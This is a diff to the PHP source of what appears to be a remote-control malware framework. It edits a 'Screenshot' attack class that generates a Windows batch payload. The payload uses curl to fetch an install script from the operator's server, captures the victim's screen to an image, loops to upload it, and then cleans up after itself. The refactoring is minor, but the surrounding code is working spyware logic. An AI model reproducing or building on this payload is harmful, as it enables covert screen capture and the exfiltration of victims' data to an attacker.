@@ -15,8 +15,8 @@ use Kelvinho\Virus\Attack\BaseScriptWin;
  */
 class Screenshot extends AttackBase {
 
-    public function generateBatchCode(): string {
-        ob_start(); //@formatter:off ?>
+    public function generateBatchCode(): void {
+        //@formatter:off ?>
         @echo off
         if not exist "%~pd0..\..\utils\scst.exe" (
             >"%~pd0install.cmd" curl -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/extras/install\n"; ?>
@@ -26,7 +26,7 @@ class Screenshot extends AttackBase {
         "%~pd0..\..\utils\scst.exe" "%~pd0screen.png"
         <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode()); ?>
         <?php echo BaseScriptWin::cleanUpPayload(); ?>
-        <?php return ob_get_clean(); //@formatter:on
+        <?php //@formatter:on
     }
 
     private function generateUploadCode(): string {
